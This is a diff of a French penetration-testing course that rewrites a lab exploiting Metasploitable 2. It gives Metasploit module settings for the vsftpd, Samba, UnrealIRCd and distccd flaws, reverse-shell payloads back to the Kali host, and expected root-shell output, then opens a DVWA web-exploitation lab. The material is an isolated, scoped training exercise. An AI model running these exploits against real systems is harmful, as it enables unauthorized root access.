+(UNKNOWN) [192.168.56.103] 6200 (?) : Connection refused
+# rc=1
 ```
 
-**Explication du script** :
+**Lecture** — la ligne `Command shell session 1 opened (... -> 192.168.56.103:6200)` établit la connexion, et `uid=0(root)` établit le privilège. Les deux lignes sont dans le même fichier `prouve`, avec `# date`, `# cmd` et `# rc=0`. Le second contrôle retourne `Connection refused` avec `# rc=1` : il confirme que la session a bien été fermée. Si le port reste ouvert, attendez ou restaurez le snapshot ; ne laissez pas un shell ouvert entre deux étapes.
 
-| Ligne | Rôle | Pourquoi |
-|---|---|---|
-| `use exploit/unix/ftp/vsftpd_234_backdoor` | charge le module | module dédié à la backdoor vsftpd 2.3.4 |
-| `set RHOSTS 192.168.56.103` | cible | adresse de Metasploitable 2 |
-| `set RPORT 21` | port FTP | la backdoor est déclenchée par le service FTP |
-| `set TARGET 1` | type de cible | `Backdoor Command Shell` ; le shell est sur `6200/tcp` |
-| `show options` | vérification | affiche les options réellement prises en compte |
-| `exploit -z` | lance l'exploit | `-z` met la session en arrière-plan après ouverture |
-| `sleep 8` | attente | la backdoor met quelques secondes à ouvrir `6200/tcp` |
-| `sessions -l` | inventaire | prouve qu'une session existe et affiche le couple source/destination |
-| `sessions -c "id; hostname; uname -a"` | preuve | trois commandes courtes, non destructives, qui identifient le contexte |
-| `sessions -K` | fermeture | tue la session ; aucune persistance n'est laissée |
-| `exit -y` | sortie | quitte `msfconsole` sans confirmation interactive |
+**Preuve** — `preuves/ch1-lab7/exploitation/msf-vsftpd.txt` et `msf-vsftpd-port6200.txt`.
 
-**Pourquoi ce résultat est une preuve** — la ligne `Command shell session 1 opened (... -> 192.168.56.103:6200)` établit la connexion, et `uid=0(root)` établit le privilège. Les deux lignes sont dans le même fichier `prouve`, avec `# date`, `# cmd` et `# rc=0`.
-
-**Piège courant — la commande `check`** : n'ajoutez pas `check` avant `exploit -z`. Le module exécute déjà son auto-check dans `exploit`. Une commande `check` explicite peut déclencher la backdoor, laisser `6200/tcp` ouvert, puis provoquer l'échec :
-
-```text
-[!] 192.168.56.103:21 - Unable to connect to backdoor on 6200/TCP. Cooldown?
-[-] 192.168.56.103:21 - The port used by the backdoor bind listener is already open/in-use (6200/TCP)
-```
-
-Dans ce cas, ne forcez pas avec `set ForceExploit true` au premier essai. Fermez Metasploit, vérifiez `nc -zv 192.168.56.103 6200`, attendez la fermeture ou restaurez le snapshot `avant-exploitation`. Le script fourni ne contient pas `check` : c'est volontaire.
-
-**Nettoyage** — le script termine par `sessions -K`. Vérifiez que le port est refermé :
-
-```bash
-prouve msf-vsftpd-port6200.txt bash -c 'nc -zv 192.168.56.103 6200'
-```
-
-Résultat attendu : `Connection refused` ou timeout, avec `# rc=1` ou `# rc=124`. Si le port reste ouvert, attendez ou restaurez le snapshot ; ne laissez pas un shell ouvert entre deux étapes.
-
-### 12.6 Étape 2 — Samba 3.0.20 (CVE-2007-2447)
+#### Étape 4 — Samba 3.0.20 (CVE-2007-2447)
 
 **But** — exploiter `username map script` dans Samba 3.0.20 et obtenir un shell root par reverse TCP.
 
 **Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
 
-**Prérequis** — port `445/tcp` ouvert, LPORT `4446` libre, snapshot pris.
+**Prérequis** — port `445/tcp` ouvert, LPORT `4446` libre, snapshot `avant-exploitation` pris, scripts de l'étape 2 présents.
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab7/exploitation`
+
+**Exemple de commande**
 
 ```bash
 prouve msf-samba.txt timeout 180 msfconsole -q -r samba.rc
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve msf-samba.txt` : enregistre la session Metasploit et le code retour.
+- `timeout 180` : borne l'exécution à 180 secondes.
+- `msfconsole -q` : lance Metasploit en mode silencieux.
+- `-r samba.rc` : exécute le script de ressources Samba.
+- `use exploit/multi/samba/usermap_script` : charge le module qui exploite l'option `username map script`.
+- `set RHOSTS 192.168.56.103` : fixe l'adresse de Metasploitable 2.
+- `set RPORT 445` : fixe le port SMB.
+- `set LHOST 192.168.56.101` : fixe l'adresse d'écoute, joignable depuis la cible.
+- `set LPORT 4446` : fixe le port d'écoute et évite les conflits avec les autres modules.
+- `set payload cmd/unix/reverse` : charge un shell Unix reverse, sans Meterpreter.
+- `exploit -z` : lance l'exploit et met la session en arrière-plan.
+- `sleep 6` : laisse le temps au handler et au shell de s'établir.
+- `sessions -l` : inventorie la session et son port source.
+- `sessions -c "id; hostname; uname -a"` : exécute les commandes de preuve.
+- `sessions -K` : ferme la session ; aucune persistance.
+- `exit -y` : quitte Metasploit.
+- Piège courant : lancer deux modules en parallèle sur le même LPORT ; le second handler ne démarre pas. Vérifiez avec `ss -lntp | grep 4446` et changez le LPORT dans le `.rc` si nécessaire.
+
+**Résultat attendu**
 
 ```text
 [*] Started reverse TCP double handler on 192.168.56.101:4446
@@ -2899,42 +4328,47 @@ Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 G
 # rc=0
 ```
 
-**Explication du script** :
+**Lecture** — `smbd` tourne en root sur cette image et le script `username map` est exécuté avec ses privilèges. Le résultat `uid=0(root)` est donc attendu, mais il doit être prouvé, pas supposé. Si le port `445` est filtré, le module échoue avant le handler : revenez au Lab-05 et vérifiez le service.
 
-| Ligne | Rôle | Pourquoi |
-|---|---|---|
-| `use exploit/multi/samba/usermap_script` | charge le module | exploite l'option `username map script` de Samba |
-| `set RHOSTS 192.168.56.103` | cible | adresse de Metasploitable 2 |
-| `set RPORT 445` | port SMB | Samba écoute sur `445/tcp` |
-| `set LHOST 192.168.56.101` | adresse d'écoute | Kali doit être joignable depuis la cible |
-| `set LPORT 4446` | port d'écoute | évite les conflits avec les autres modules |
-| `set payload cmd/unix/reverse` | charge utile | shell Unix reverse, sans Meterpreter |
-| `exploit -z` | lance l'exploit | session en arrière-plan |
-| `sleep 6` | attente | laisse le temps au handler et au shell de s'établir |
-| `sessions -l` | inventaire | prouve la session et le port source |
-| `sessions -c "id; hostname; uname -a"` | preuve | identité et privilège |
-| `sessions -K` | fermeture | aucune persistance |
-| `exit -y` | sortie | quitte Metasploit |
+**Preuve** — `preuves/ch1-lab7/exploitation/msf-samba.txt`.
 
-**Pourquoi le shell est root** — `smbd` tourne en root sur cette image et le script `username map` est exécuté avec ses privilèges. Le résultat `uid=0(root)` est donc attendu, mais il doit être prouvé, pas supposé.
-
-**Piège courant** — si `4446` est déjà utilisé, le handler ne démarre pas. Vérifiez avec `ss -lntp | grep 4446` et changez le LPORT dans le `.rc`. Ne lancez pas deux modules en parallèle sur le même LPORT. Si le port `445` est filtré, le module échoue avant le handler : revenez au Lab-05 et vérifiez le service.
-
-### 12.7 Étape 3 — UnrealIRCd 3.2.8.1 (CVE-2010-2075)
+#### Étape 5 — UnrealIRCd 3.2.8.1 (CVE-2010-2075)
 
 **But** — déclencher la backdoor d'UnrealIRCd 3.2.8.1 et obtenir un shell root.
 
 **Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
 
-**Prérequis** — port `6667/tcp` ouvert, LPORT `4447` libre, snapshot pris.
+**Prérequis** — port `6667/tcp` ouvert, LPORT `4447` libre, snapshot `avant-exploitation` pris, scripts de l'étape 2 présents.
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab7/exploitation`
+
+**Exemple de commande**
 
 ```bash
 prouve msf-unreal.txt timeout 180 msfconsole -q -r unreal.rc
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve msf-unreal.txt` : enregistre la session Metasploit et le code retour.
+- `timeout 180` : borne l'exécution à 180 secondes.
+- `msfconsole -q` : lance Metasploit en mode silencieux.
+- `-r unreal.rc` : exécute le script de ressources UnrealIRCd.
+- `use exploit/unix/irc/unreal_ircd_3281_backdoor` : charge le module de la backdoor UnrealIRCd 3.2.8.1.
+- `set RHOSTS 192.168.56.103` : fixe l'adresse de Metasploitable 2.
+- `set RPORT 6667` : fixe le port IRC en clair ; `6697` est le port TLS et ne déclenche pas le même chemin.
+- `set LHOST 192.168.56.101` : fixe l'adresse d'écoute.
+- `set LPORT 4447` : fixe le port d'écoute et évite le conflit avec Samba.
+- `set payload cmd/unix/reverse` : charge un shell Unix reverse.
+- `exploit -z` : lance l'exploit et met la session en arrière-plan.
+- `sleep 6` : laisse le temps au shell de revenir.
+- `sessions -l` : inventorie la session.
+- `sessions -c "id; hostname; uname -a"` : exécute les commandes de preuve.
+- `sessions -K` : ferme la session ; aucune persistance.
+- `exit -y` : quitte Metasploit.
+- Piège courant : confondre `6667` et `6697`. Le module cible l'IRC en clair ; `6697` peut être fermé ou TLS et donner un faux négatif. L'auto-check IRC du module est normal, contrairement au `check` explicite de vsftpd.
+
+**Résultat attendu**
 
 ```text
 [+] 192.168.56.103:6667 - The target appears to be vulnerable. UnrealIRCd detected via IRC commands
@@ -2947,42 +4381,47 @@ Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 G
 # rc=0
 ```
 
-**Explication du script** :
+**Lecture** — le démon UnrealIRCd de Metasploitable 2 tourne en root ; la backdoor exécute la commande avec ce privilège. Le résultat est cohérent avec la matrice de risques du Lab-06.
 
-| Ligne | Rôle | Pourquoi |
-|---|---|---|
-| `use exploit/unix/irc/unreal_ircd_3281_backdoor` | charge le module | backdoor connue d'UnrealIRCd 3.2.8.1 |
-| `set RHOSTS 192.168.56.103` | cible | adresse de Metasploitable 2 |
-| `set RPORT 6667` | port IRC | port non TLS ; `6697` est le port TLS et ne déclenche pas le même chemin |
-| `set LHOST 192.168.56.101` | adresse d'écoute | Kali |
-| `set LPORT 4447` | port d'écoute | évite le conflit avec Samba |
-| `set payload cmd/unix/reverse` | charge utile | shell Unix reverse |
-| `exploit -z` | lance l'exploit | session en arrière-plan |
-| `sleep 6` | attente | laisse le temps au shell de revenir |
-| `sessions -l` | inventaire | preuve de session |
-| `sessions -c "id; hostname; uname -a"` | preuve | identité et privilège |
-| `sessions -K` | fermeture | aucune persistance |
-| `exit -y` | sortie | quitte Metasploit |
+**Preuve** — `preuves/ch1-lab7/exploitation/msf-unreal.txt`.
 
-**Pourquoi le résultat est root** — le démon UnrealIRCd de Metasploitable 2 tourne en root ; la backdoor exécute la commande avec ce privilège. Le résultat est cohérent avec la matrice de risques du Lab-06.
-
-**Piège courant** — ne confondez pas `6667` et `6697`. Le module cible le service IRC en clair ; `6697` peut être fermé ou TLS et donner un faux négatif. Le module exécute un auto-check IRC : la ligne `Running automatic check` est normale, contrairement au cas vsftpd où une commande `check` explicite casse l'état de la backdoor.
-
-### 12.8 Étape 4 — distccd v1 (CVE-2004-2687)
+#### Étape 6 — distccd v1 (CVE-2004-2687)
 
 **But** — exécuter une commande via `distccd` et obtenir un shell avec l'utilisateur `daemon`.
 
 **Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
 
-**Prérequis** — port `3632/tcp` ouvert, LPORT `4448` libre, snapshot pris.
+**Prérequis** — port `3632/tcp` ouvert, LPORT `4448` libre, snapshot `avant-exploitation` pris, scripts de l'étape 2 présents.
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab7/exploitation`
+
+**Exemple de commande**
 
 ```bash
 prouve msf-distcc.txt timeout 180 msfconsole -q -r distcc.rc
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve msf-distcc.txt` : enregistre la session Metasploit et le code retour.
+- `timeout 180` : borne l'exécution à 180 secondes.
+- `msfconsole -q` : lance Metasploit en mode silencieux.
+- `-r distcc.rc` : exécute le script de ressources distcc.
+- `use exploit/unix/misc/distcc_exec` : charge le module qui exploite l'exécution de commandes de `distccd`.
+- `set RHOSTS 192.168.56.103` : fixe l'adresse de Metasploitable 2.
+- `set RPORT 3632` : fixe le port du service `distccd`.
+- `set LHOST 192.168.56.101` : fixe l'adresse d'écoute.
+- `set LPORT 4448` : fixe le port d'écoute et évite les conflits avec les autres modules.
+- `set payload cmd/unix/reverse` : charge un shell Unix reverse.
+- `exploit -z` : lance l'exploit et met la session en arrière-plan.
+- `sleep 6` : laisse le temps au shell de revenir.
+- `sessions -l` : inventorie la session.
+- `sessions -c "id; hostname; uname -a"` : exécute les commandes de preuve.
+- `sessions -K` : ferme la session ; aucune persistance.
+- `exit -y` : quitte Metasploit.
+- Piège courant : chercher à élever le shell `daemon` en root dans ce lab. L'élévation locale relève de T1068 et du chapitre 3, avec snapshot et validation.
+
+**Résultat attendu**
 
 ```text
 [*] Started reverse TCP double handler on 192.168.56.101:4448
@@ -2994,41 +4433,39 @@ Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 G
 # rc=0
 ```
 
-**Explication du script** :
+**Lecture** — `distccd` est lancé avec l'utilisateur `daemon`. Le résultat `uid=1(daemon)` est correct et ne doit pas être présenté comme un échec. Il illustre la différence entre une exécution de commande et une élévation de privilèges.
 
-| Ligne | Rôle | Pourquoi |
-|---|---|---|
-| `use exploit/unix/misc/distcc_exec` | charge le module | exploite l'exécution de commandes de `distccd` |
-| `set RHOSTS 192.168.56.103` | cible | adresse de Metasploitable 2 |
-| `set RPORT 3632` | port distcc | service `distccd` |
-| `set LHOST 192.168.56.101` | adresse d'écoute | Kali |
-| `set LPORT 4448` | port d'écoute | évite les conflits avec les autres modules |
-| `set payload cmd/unix/reverse` | charge utile | shell Unix reverse |
-| `exploit -z` | lance l'exploit | session en arrière-plan |
-| `sleep 6` | attente | laisse le temps au shell de revenir |
-| `sessions -l` | inventaire | preuve de session |
-| `sessions -c "id; hostname; uname -a"` | preuve | identité et privilège |
-| `sessions -K` | fermeture | aucune persistance |
-| `exit -y` | sortie | quitte Metasploit |
+**Preuve** — `preuves/ch1-lab7/exploitation/msf-distcc.txt`.
 
-**Pourquoi le shell n'est pas root** — `distccd` est lancé avec l'utilisateur `daemon`. Le résultat `uid=1(daemon)` est correct et ne doit pas être présenté comme un échec. Il illustre la différence entre une exécution de commande et une élévation de privilèges.
+#### Étape 7 — Exécuter les quatre scripts en série
 
-**Piège courant** — l'élévation locale relève de T1068 et du chapitre 3, avec snapshot et validation. Dans ce lab, le but est de prouver CVE-2004-2687, pas de transformer un shell `daemon` en root.
+**But** — produire un jeu de preuves homogène en exécutant les quatre modules dans l'ordre, sans masquer un échec.
 
-### 12.9 Exécution groupée, archivage et qualification des 12 CVE
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
 
-#### 12.9.1 Exécution groupée
-
-Après avoir validé chaque script individuellement, exécutez le runner pour produire un jeu de preuves homogène :
+**Prérequis** — quatre preuves individuelles obtenues aux étapes 3 à 6 ; runner `run-cve.sh` présent.
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab7/exploitation`
+
+**Exemple de commande**
 
 ```bash
 prouve run-all.txt bash run-cve.sh
 grep -H '^# rc=' msf-*.txt
 ```
 
-Résultat attendu :
+**Explication de la commande**
+
+- `prouve run-all.txt` : enregistre la console complète du runner et son code retour.
+- `bash run-cve.sh` : exécute le runner, qui boucle sur vsftpd, samba, unreal et distcc.
+- Le runner appelle `prouve` et `timeout 180` pour chaque module.
+- `|| true` dans le runner : un échec de module n'arrête pas les suivants.
+- `grep -H '^# rc='` : affiche le code retour de chaque preuve avec le nom du fichier.
+- `-H` : préfixe chaque ligne par le chemin du fichier.
+- `msf-*.txt` : les quatre preuves individuelles.
+- Piège courant : lire uniquement le `# rc=0` final de `run-all.txt` et ignorer un `msf-*.txt` en échec ; lisez les quatre fichiers.
+
+**Résultat attendu**
 
 ```text
 /home/kali/preuves/ch1-lab7/exploitation/msf-vsftpd.txt:# rc=0
@@ -3038,9 +4475,45 @@ Résultat attendu :
 # rc=0
 ```
 
-Le runner exécute les quatre scripts dans l'ordre, avec `timeout 180` et `prouve`. Le fichier `run-all.txt` conserve la console complète ; les fichiers `msf-*.txt` sont les preuves individuelles. Si un module échoue, le runner continue (`|| true`) et le `grep` final montre le `# rc` de chaque preuve : lisez le fichier en échec avant de conclure.
+Le fichier `run-all.txt` conserve la console complète ; les fichiers `msf-*.txt` sont les preuves individuelles. Si un module échoue, le runner continue et le `grep` final montre le `# rc` de chaque preuve : lisez le fichier en échec avant de conclure.
 
-#### 12.9.2 Aboutissement et qualification des 12 CVE
+**Preuve** — `preuves/ch1-lab7/exploitation/run-all.txt`.
+
+#### Étape 8 — Qualifier les 12 CVE
+
+**But** — vérifier la présence de chaque CVE dans la base Exploit-DB et documenter les quatre abouties et les huit non abouties.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — preuves des étapes 3 à 7 ; base Exploit-DB locale.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+cd ~/preuves/ch1-lab7
+for cve in CVE-2011-2523 CVE-2007-2447 CVE-2010-2075 CVE-2004-2687 CVE-2010-4221 CVE-2011-3192 CVE-2012-1823 CVE-2008-0166 CVE-2008-0600 CVE-2008-0010 CVE-2008-0009 CVE-2021-4158; do
+  printf '%s: ' "$cve"
+  searchsploit --cve "$cve" 2>&1 | grep -c 'Exploit Title'
+done
+```
+
+**Explication de la commande**
+
+- `cd ~/preuves/ch1-lab7` : place le shell dans le répertoire des preuves.
+- `for cve in ...; do ... done` : boucle sur les douze CVE.
+- `printf '%s: ' "$cve"` : affiche le code CVE sans retour à la ligne.
+- `searchsploit --cve "$cve"` : interroge la base locale pour la CVE.
+- `2>&1` : redirige les erreurs vers la sortie standard.
+- `grep -c 'Exploit Title'` : compte les blocs de résultats.
+- Piège courant : `grep 'No Results'` peut matcher `Shellcodes: No Results` et faire croire à tort qu'une CVE est absente. Comptez le bloc `Exploit Title` ou lisez le fichier `cve-*.txt`.
+
+**Résultat attendu**
+
+Onze lignes avec `1` et une ligne avec `0` (`CVE-2021-4158`, CVE QEMU hôte hors Exploit-DB).
+
+**Tableau de qualification**
 
 | CVE | Service / version | Statut dans ce lab | Preuve | Justification |
 |---|---|---|---|---|
@@ -3059,23 +4532,19 @@ Le runner exécute les quatre scripts dans l'ordre, avec `timeout 180` et `prouv
 
 **Lecture** — quatre CVE sont **abouties** : une session a été obtenue et une commande a été exécutée (`# rc=0`). Huit CVE sont **non abouties** dans ce périmètre, avec une justification vérifiable : version hors plage, DoS interdit, configuration CGI absente, validation de version seule, privesc local non testé et CVE hôte hors périmètre. Les 11 CVE cibles sont présentes dans la base Exploit-DB de Kali ; la douzième, `CVE-2021-4158`, est une CVE QEMU/ACPI qui ne concerne ni Metasploitable 2 ni VirtualBox et ne doit pas être testée (DoS). Le lab documente l'exception au lieu de forcer une conclusion. Les CVE non exécutées sont des décisions de périmètre ou de configuration, pas des oublis.
 
-Vérifiez la présence avec le compteur de titres, pas avec `grep 'No Results'` :
+**Preuve** — `preuves/ch1-lab7/resultats-cve-v3.csv` (12 lignes) et sortie du compteur.
 
-> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+#### Étape 9 — Archiver les preuves sur l'hôte
 
-```bash
-cd ~/preuves/ch1-lab7
-for cve in CVE-2011-2523 CVE-2007-2447 CVE-2010-2075 CVE-2004-2687 CVE-2010-4221 CVE-2011-3192 CVE-2012-1823 CVE-2008-0166 CVE-2008-0600 CVE-2008-0010 CVE-2008-0009 CVE-2021-4158; do
-  printf '%s: ' "$cve"
-  searchsploit --cve "$cve" 2>&1 | grep -c 'Exploit Title'
-done
-```
+**But** — copier les preuves de Kali vers l'hôte et vérifier leur intégrité par empreinte SHA-256.
 
-Résultat attendu : onze lignes avec `1` et une ligne avec `0` (`CVE-2021-4158`, CVE QEMU hôte hors Exploit-DB). **Piège** : `grep 'No Results'` peut matcher `Shellcodes: No Results` et faire croire à tort qu'une CVE est absente. Comptez le bloc `Exploit Title` ou lisez le fichier `cve-*.txt`.
+**Machine** — hôte (hyperviseur).
 
-#### 12.9.3 Archivage sur l'hôte
+**Prérequis** — preuves des étapes 1 à 8 présentes sur Kali ; accès SSH à Kali.
 
-> **Machine** : hôte (hyperviseur) | **Terminal** : terminal local | **Utilisateur** : votre compte | **Répertoire** : racine du projet `hacking-contre-mesure-niveau-2`
+> **Machine** : hôte (192.168.56.1) | **Terminal** : terminal local | **Utilisateur** : votre compte | **Répertoire** : racine du projet `hacking-contre-mesure-niveau-2`
+
+**Exemple de commande**
 
 ```bash
 mkdir -p preuves/ch1-lab7
@@ -3084,21 +4553,56 @@ find preuves/ch1-lab7 -type f ! -name SHA256SUMS -print0 | sort -z | xargs -0 sh
 sha256sum -c preuves/ch1-lab7/SHA256SUMS
 ```
 
-**Explication de la commande** — les preuves sont produites sur Kali mais archivées sur l'hôte, avec une empreinte vérifiable. `scp -r` copie les fichiers et sous-répertoires ; `find` exclut le fichier de sommes lui-même ; `sort -z` stabilise l'ordre ; `sha256sum -c` vérifie l'intégrité. Le résultat attendu est une suite de `OK`.
+**Explication de la commande**
+
+- `mkdir -p preuves/ch1-lab7` : crée le répertoire d'archivage sur l'hôte.
+- `scp -r kali@192.168.56.101:/home/kali/preuves/ch1-lab7/. preuves/ch1-lab7/` : copie récursivement le contenu du répertoire distant.
+- `find preuves/ch1-lab7 -type f` : liste les fichiers réguliers.
+- `! -name SHA256SUMS` : exclut le fichier de sommes lui-même.
+- `-print0` : sépare les noms par un octet nul.
+- `sort -z` : trie les noms avec le séparateur nul.
+- `xargs -0 sha256sum` : calcule les empreintes sans casser les noms contenant des espaces.
+- `> preuves/ch1-lab7/SHA256SUMS` : écrit le fichier de sommes.
+- `sha256sum -c` : vérifie chaque fichier ; `OK` signifie que l'empreinte correspond.
+- Piège courant : archiver sans `SHA256SUMS` ou modifier une preuve après le calcul ; l'archive n'est plus vérifiable.
+
+**Résultat attendu**
+
+Une suite de `OK` pour chaque fichier.
 
 Le fichier `preuves/ch1-lab7/resultats-cve-v3.csv` reprend les 12 lignes du tableau avec les colonnes `cible,vecteur,cve,module_ou_commande,statut,preuve,resultat,limite`. Il sert de source pour le rapport et pour la mise à jour de la matrice de risques.
 
-#### 12.9.4 Retour à l'état de référence
+**Preuve** — `preuves/ch1-lab7/SHA256SUMS` et `preuves/ch1-lab7/resultats-cve-v3.csv`.
 
-Demandez au sysadmin, ou utilisez l'interface VirtualBox, pour restaurer le snapshot `avant-exploitation` de Metasploitable 2. Ne lancez pas `VBoxManage` depuis Kali : la gestion des VM est réservée à l'hôte et au sysadmin.
+#### Étape 10 — Revenir à l'état de référence
+
+**But** — restaurer le snapshot `avant-exploitation` et vérifier que les quatre services sont revenus et que `6200/tcp` est fermé.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — snapshot `avant-exploitation` restauré depuis l'interface VirtualBox de l'hôte.
 
 > **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve post-rollback.txt bash -c 'ping -c 2 192.168.56.103; for p in 21 445 6667 3632; do nc -zv 192.168.56.103 "$p"; done; if nc -zv 192.168.56.103 6200; then echo "6200 OPEN"; exit 1; else echo "6200 CLOSED"; fi'
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve post-rollback.txt` : enregistre le contrôle de retour à l'état de référence.
+- `bash -c '...'` : exécute la séquence dans un shell enfant.
+- `ping -c 2 192.168.56.103` : confirme que la cible répond après le rollback.
+- `for p in 21 445 6667 3632; do ... done` : boucle sur les quatre services attendus.
+- `nc -zv 192.168.56.103 "$p"` : vérifie l'ouverture de chaque service.
+- `if nc -zv 192.168.56.103 6200; then ... fi` : teste le port de la backdoor.
+- `echo "6200 OPEN"; exit 1` : signale un état non conforme et fait échouer la preuve.
+- `else echo "6200 CLOSED"` : confirme la fermeture du port.
+- Piège courant : lancer `VBoxManage` depuis Kali ; la gestion des VM est réservée à l'hôte.
+
+**Résultat attendu**
 
 ```text
 2 packets transmitted, 2 received, 0% packet loss, time 1027ms
@@ -3113,27 +4617,29 @@ Résultat attendu (extrait réel) :
 
 Si `6200` est encore ouvert, attendez la fin du processus ou restaurez à nouveau le snapshot. Ne poursuivez pas vers le Lab-08 avec un état de cible incertain.
 
-### 12.10 Critères de réussite
+**Preuve** — `preuves/ch1-lab7/exploitation/post-rollback.txt`.
 
-- [ ] Les quatre preuves `msf-vsftpd.txt`, `msf-samba.txt`, `msf-unreal.txt` et `msf-distcc.txt` existent et contiennent `# rc=0`.
-- [ ] Chaque preuve contient une session ouverte et la sortie de `id; hostname; uname -a`.
-- [ ] vsftpd, Samba et UnrealIRCd donnent `uid=0(root)` ; distcc donne `uid=1(daemon)`.
-- [ ] Le script `vsftpd.rc` ne contient pas de commande `check` avant `exploit`.
-- [ ] Les 12 CVE sont qualifiées dans le tableau 12.9.2 ; `CVE-2021-4158` est documentée comme CVE QEMU hôte hors périmètre.
-- [ ] `preuves/ch1-lab7/resultats-cve-v3.csv` contient 12 lignes de données.
-- [ ] Les preuves sont copiées sur l'hôte et `sha256sum -c` retourne `OK`.
-- [ ] Le snapshot `avant-exploitation` est restauré ; `6200/tcp` est fermé ; les quatre services sont revenus.
-- [ ] Aucune persistance, aucun déni de service, aucune force brute, aucune cible hors `192.168.56.0/24`.
-
-### 12.11 Conclusion
+### En conclusion
 
 Ce lab a démontré, sur la cible isolée `192.168.56.103`, l'aboutissement de quatre CVE : vsftpd 2.3.4 (CVE-2011-2523), Samba 3.0.20 (CVE-2007-2447), UnrealIRCd 3.2.8.1 (CVE-2010-2075) et distccd v1 (CVE-2004-2687). Trois sessions ont donné `uid=0(root)` ; distcc a donné `uid=1(daemon)`. Chaque résultat est daté, associé à une commande, à une sortie et à `# rc=0`. Les huit autres CVE sont qualifiées avec leur limite : version hors plage, DoS interdit, CGI non exploitable, privesc local non testé ou absence dans Kali.
 
 Dans la chaîne d'exploitation, ce lab se situe après la reconnaissance (Lab-05), la validation CVE (Lab-06) et la matrice de risques. Il transforme une **hypothèse validée par version** en **accès concret**. Le rollback `avant-exploitation` referme la chaîne : aucune session, persistance ou modification ne doit rester. Le Lab-08 applique la même logique à la couche web, avec SQLi, XSS et exfiltration.
 
-## 13. Lab-08 — Exploitation web DVWA : SQLi, XSS et exfiltration
+**Critères de réussite**
 
-### 13.1 Énoncé / Contexte et objectif
+- [ ] Les quatre preuves `msf-vsftpd.txt`, `msf-samba.txt`, `msf-unreal.txt` et `msf-distcc.txt` existent et contiennent `# rc=0`.
+- [ ] Chaque preuve contient une session ouverte et la sortie de `id; hostname; uname -a`.
+- [ ] vsftpd, Samba et UnrealIRCd donnent `uid=0(root)` ; distcc donne `uid=1(daemon)`.
+- [ ] Le script `vsftpd.rc` ne contient pas de commande `check` avant `exploit`.
+- [ ] Les 12 CVE sont qualifiées à l'étape 8 de ce lab ; `CVE-2021-4158` est documentée comme CVE QEMU hôte hors périmètre.
+- [ ] `preuves/ch1-lab7/resultats-cve-v3.csv` contient 12 lignes de données.
+- [ ] Les preuves sont copiées sur l'hôte et `sha256sum -c` retourne `OK`.
+- [ ] Le snapshot `avant-exploitation` est restauré ; `6200/tcp` est fermé ; les quatre services sont revenus.
+- [ ] Aucune persistance, aucun déni de service, aucune force brute, aucune cible hors `192.168.56.0/24`.
+
+## Lab-08 — Exploitation web DVWA : SQLi, XSS et exfiltration
+
+### Énoncé / Contexte
 
 Le Lab-05 a identifié DVWA sur `http://192.168.56.103/dvwa`. Ce lab transforme cette découverte en **exploitation web**. Il couvre cinq vulnérabilités applicatives et deux formes d'exfiltration :
 
@@ -3155,19 +4661,7 @@ Le Lab-05 a identifié DVWA sur `http://192.168.56.103/dvwa`. Ce lab transforme 
 
 **Pourquoi le niveau `low`** — DVWA est conçu pour être vulnérable. Le niveau `low` supprime les protections d'entrée et de sortie. Le lab ne prétend pas que ces vulnérabilités existent avec la même facilité en production ; il montre le mécanisme, la preuve et la contre-mesure.
 
-**Outils et commandes utilisées**
-
-| Outil | Commandes | Rôle |
-|---|---|---|
-| `curl` | `-c`, `-b`, `-d`, `-G`, `--data-urlencode` | Login, cookie jar, SQLi, XSS, commande, LFI |
-| `sqlmap` | `--dbs`, `--tables`, `--dump`, `--answers=crack=N` | Détection et exfiltration SQL |
-| `python3` | `xss-browser-test.py` | Automatisation du navigateur et du callback |
-| Selenium / Chromium / chromedriver | `webdriver.Chrome`, `execute_script`, `get_cookies` | Exécution JavaScript réelle |
-| `prouve` | `prouve 01-login.txt ...` | Preuve horodatée avec code retour |
-| `ss` | `ss -lntp \| grep ':8000'` | Vérification du listener de callback |
-| `scp` / `sha256sum` | Archivage et hachage | Intégrité des preuves |
-
-### 13.2 Plan MITRE ATT&CK
+**Plan MITRE ATT&CK**
 
 | Élément | Valeur |
 |---|---|
@@ -3181,7 +4675,7 @@ Le Lab-05 a identifié DVWA sur `http://192.168.56.103/dvwa`. Ce lab transforme 
 
 > **Avenant ATT&CK** — ces techniques sont ajoutées au chapitre 1 par l'avenant A.7. T1190 et T1210 sont déjà cartographiés au chapitre 2/5 ; ce lab les exécute ici dans un cadre isolé, sans modifier le séquencement de référence des 24 labs.
 
-### 13.3 Prérequis
+**Prérequis**
 
